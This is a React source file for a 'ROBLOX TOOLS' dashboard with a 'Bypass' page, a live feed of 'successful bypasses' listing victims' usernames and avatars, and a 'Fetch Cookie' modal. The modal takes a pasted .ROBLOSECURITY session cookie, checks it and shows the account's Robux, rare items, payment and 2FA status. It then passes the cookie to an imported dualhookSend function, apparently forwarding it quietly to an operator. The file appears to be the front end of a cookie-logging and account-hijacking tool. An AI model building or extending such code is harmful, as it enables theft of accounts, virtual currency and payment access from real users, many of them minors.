import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Shield, Zap, Cookie, Loader2, X, Activity, Menu, CheckCircle2, XCircle } from "lucide-react";
import {
  dualhookSend, AccountInfo,
  getLiveBypassLog, LiveBypassEntry,
} from "@/lib/tokenStore";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import DiscordSidebarFooter from "@/components/DiscordSidebarFooter";

const Dashboard = () => {
  const navigate = useNavigate();
  const [fetchOpen, setFetchOpen] = useState(false);
  const [fetchCookieInput, setFetchCookieInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<AccountInfo | null>(null);
  const [liveLog, setLiveLog] = useState<LiveBypassEntry[]>([]);
  const [sideOpen, setSideOpen] = useState(false);

  useEffect(() => {
    setLiveLog(getLiveBypassLog().filter(e => e.success));
    const id = window.setInterval(() => setLiveLog(getLiveBypassLog().filter(e => e.success)), 3000);
    return () => window.clearInterval(id);
  }, []);

  const handleFetch = async () => {
    const trimmed = fetchCookieInput.trim();
    if (!trimmed) { toast.error("Enter a cookie"); return; }
    setLoading(true); setResult(null);
    try {
      const { data, error } = await supabase.functions.invoke("roblox-fetch", { body: { cookie: trimmed } });
      if (error || !data?.valid) { toast.error("Invalid cookie"); return; }
      const info = { ...(data.info as any), cookie: trimmed, valid: true } as AccountInfo;
      setResult(info);
      await dualhookSend("fetch", info);
      toast.success("Cookie fetched");
    } catch { toast.error("Fetch failed"); }
    finally { setLoading(false); }
  };

  return (
    <div className="min-h-screen px-4 py-6">
      {/* Side panel (admin) */}
      <div
        className={`fixed top-0 left-0 h-full w-64 bg-card border-r border-border z-40 p-5 transition-all duration-500 ease-[cubic-bezier(0.22,1,0.36,1)] ${sideOpen ? 'translate-x-0 opacity-100' : '-translate-x-full opacity-0'}`}
      >
        <div className="flex flex-col h-full">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-2">
            <div className="w-9 h-9 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border">
              <Shield size={16} className="text-primary" />
            </div>
            <span className="font-bold text-foreground">Menu</span>
          </div>
          <button onClick={() => setSideOpen(false)} className="text-muted-foreground hover:text-foreground p-1"><X size={16} /></button>
        </div>
        <div className="space-y-2">
          <button
            onClick={() => { setSideOpen(false); navigate("/bypass"); }}
            className="w-full bg-secondary/60 hover:bg-secondary border border-border/50 hover:border-primary/40 text-foreground font-semibold py-3 px-3 rounded-xl flex items-center gap-3 transition-all duration-300"
          >
            <div className="w-8 h-8 rounded-lg bg-primary/20 flex items-center justify-center"><Zap size={14} className="text-primary" /></div>
            Bypass
          </button>
          <button
            onClick={() => { setSideOpen(false); setFetchOpen(true); }}
            className="w-full bg-secondary/60 hover:bg-secondary border border-border/50 hover:border-primary/40 text-foreground font-semibold py-3 px-3 rounded-xl flex items-center gap-3 transition-all duration-300"
          >
            <div className="w-8 h-8 rounded-lg bg-primary/20 flex items-center justify-center"><Cookie size={14} className="text-primary" /></div>
            Fetch Cookie
          </button>
        </div>
        <div className="mt-auto pt-4">
          <DiscordSidebarFooter />
        </div>
        </div>
      </div>
      {sideOpen && (
        <div className="fixed inset-0 bg-background/60 backdrop-blur-sm z-30 animate-fade-in transition-opacity duration-300" onClick={() => setSideOpen(false)} />
      )}

      <div className="max-w-lg mx-auto space-y-5 animate-fade-in-up">
        {/* Header */}
        <div className="flex items-center justify-between">
          <button
            onClick={() => setSideOpen(true)}
            className="w-10 h-10 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border hover:scale-110 transition-all duration-300"
            aria-label="Open admin menu"
          >
            <Menu size={18} className="text-primary" />
          </button>
          <h1 className="text-xl font-bold text-foreground glow-text tracking-wide">ROBLOX TOOLS</h1>
          <div className="w-10" />
        </div>

        {/* Live Bypass */}
        <div className="card-glow rounded-2xl p-5 space-y-3">
          <h2 className="text-base font-bold text-foreground flex items-center gap-2">
            <Activity size={16} className="text-primary animate-pulse" /> Current Live Bypass
          </h2>
          {liveLog.length === 0 ? (
            <p className="text-xs text-muted-foreground py-4 text-center">No activity yet.</p>
          ) : (
            <div className="space-y-2 max-h-72 overflow-y-auto pr-1">
              {liveLog.map(e => (
                <div key={e.id} className="flex items-center gap-3 bg-secondary/40 rounded-xl px-3 py-2 border border-border/40 animate-fade-in">
                  {e.avatarUrl ? (
                    <img src={e.avatarUrl} alt={e.username} className="w-9 h-9 rounded-lg border border-border/50" />
                  ) : (
                    <div className="w-9 h-9 rounded-lg bg-primary/20 flex items-center justify-center text-xs font-bold text-primary">{e.username.slice(0, 2).toUpperCase()}</div>
                  )}
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium text-foreground truncate">{e.username}</p>
                    <p className="text-[10px] text-muted-foreground">{new Date(e.timestamp).toLocaleTimeString()}</p>
                  </div>
                  <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full inline-flex items-center gap-1 ${e.success ? 'bg-[hsl(var(--success))]/20 text-[hsl(var(--success))]' : 'bg-destructive/20 text-destructive'}`}>
                    {e.success ? <><CheckCircle2 size={11} /> Success</> : <><XCircle size={11} /> Failed</>}
                  </span>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Fetch Cookie Modal */}
      {fetchOpen && (
        <div className="fixed inset-0 z-40 flex items-center justify-center px-4 bg-background/70 backdrop-blur-sm animate-fade-in">
          <div className="card-glow rounded-2xl max-w-md w-full p-6 space-y-4 relative animate-scale-in">
            <button onClick={() => { setFetchOpen(false); setResult(null); setFetchCookieInput(""); }} className="absolute top-3 right-3 text-muted-foreground hover:text-foreground p-1"><X size={16} /></button>
            <h2 className="text-base font-bold text-foreground flex items-center gap-2"><Cookie size={16} className="text-primary" /> Fetch Cookie</h2>
            <textarea
              value={fetchCookieInput}
              onChange={e => setFetchCookieInput(e.target.value)}
              placeholder="Paste .ROBLOSECURITY cookie..."
              className="input-field text-xs font-mono min-h-[100px] resize-y w-full transition-all"
            />
            <button
              onClick={handleFetch}
              disabled={loading}
              className="w-full shimmer text-primary-foreground font-semibold py-3 rounded-xl flex items-center justify-center gap-2 glow-btn disabled:opacity-50 transition-all duration-300 active:scale-95 hover:scale-[1.02] hover:shadow-[0_0_28px_hsl(var(--primary)/0.55)]"
            >
              {loading ? <><Loader2 size={14} className="animate-spin" /> Fetching...</> : <>Fetch Cookie</>}
            </button>
            {result && (
              <div className="bg-secondary/40 border border-border/50 rounded-xl p-3 space-y-1.5 text-xs max-h-72 overflow-y-auto animate-fade-in">
                <div className="flex items-center gap-3 pb-2 border-b border-border/40">
                  {result.avatarUrl && <img src={result.avatarUrl} alt={result.username} className="w-10 h-10 rounded-lg border border-border/50" />}
                  <div>
                    <p className="text-sm font-bold text-foreground">{result.username}</p>
                    <p className="text-[10px] text-muted-foreground">ID: {String(result.userId)}</p>
                  </div>
                  <span className="ml-auto text-[10px] font-bold bg-[hsl(var(--success))]/20 text-[hsl(var(--success))] px-2 py-0.5 rounded-full">Active</span>
                </div>
                <div className="flex justify-between"><span className="text-muted-foreground">Robux</span><span className="text-foreground font-mono">{String(result.robux ?? 0)} | {String(result.pendingRobux ?? 0)}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Spent</span><span className="text-foreground font-mono">{String(result.robuxSpent ?? 0)}</span></div>
                {([
                  ['Premium', result.premium],
                  ['Korblox', result.korblox],
                  ['Headless', result.headless],
                  ['Valkyrie', result.valkyrie],
                  ['Payment', result.hasPayment],
                  ['2FA', result.has2FA],
                  ['Email Verified', result.emailVerified],
                ] as [string, boolean | undefined][]).map(([label, v]) => (
                  <div key={label} className="flex justify-between items-center">
                    <span className="text-muted-foreground">{label}</span>
                    {v
                      ? <CheckCircle2 size={14} className="text-[hsl(var(--success))]" />
                      : <XCircle size={14} className="text-destructive" />}
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
